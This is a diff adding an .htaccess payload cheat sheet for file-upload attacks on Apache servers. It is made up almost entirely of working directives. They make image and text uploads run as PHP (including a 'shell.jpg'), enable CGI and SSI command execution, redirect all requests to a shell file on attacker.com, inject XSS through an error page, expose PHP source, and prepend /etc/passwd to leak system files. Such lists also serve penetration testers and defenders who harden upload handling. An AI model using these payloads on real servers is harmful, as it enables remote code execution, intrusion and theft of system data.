@@ -1,0 +1,56 @@
+# .htaccess File Upload Attacks
+
+# ============ Execute PHP in .txt files ============
+AddType application/x-httpd-php .txt
+AddHandler application/x-httpd-php .txt
+
+# ============ Execute PHP in .jpg files ============
+AddType application/x-httpd-php .jpg
+AddHandler application/x-httpd-php .jpg .png .gif
+
+# ============ Execute any extension as PHP ============
+AddHandler php-script .whatever
+AddType application/x-httpd-php .whatever
+
+# ============ Using SetHandler ============
+<FilesMatch "\.jpg$">
+    SetHandler application/x-httpd-php
+</FilesMatch>
+
+# ============ Specific file ============
+<Files "shell.jpg">
+    SetHandler application/x-httpd-php
+</Files>
+
+# ============ PHP via CGI ============
+Options +ExecCGI
+AddHandler cgi-script .php
+AddHandler cgi-script .txt
+
+# ============ SSI (Server Side Includes) ============
+Options +Includes
+AddType text/html .shtml
+AddOutputFilter INCLUDES .shtml
+# Then create file.shtml with: <!--#exec cmd="id"-->
+
+# ============ Redirect to shell ============
+RewriteEngine On
+RewriteRule ^(.*)$ http://attacker.com/shell.txt [L]
+
+# ============ XSS via error page ============
+ErrorDocument 404 "<script>alert(1)</script>"
+
+# ============ Read source code ============
+<Files *.php>
+    ForceType text/plain
+</Files>
+
+# ============ Disable security ============
+php_flag engine off
+php_flag display_errors on
+php_value auto_prepend_file /etc/passwd
+
+# ============ Content-Type header ============
+<FilesMatch "\.php$">
+    Header set Content-Type "text/html"
+</FilesMatch>
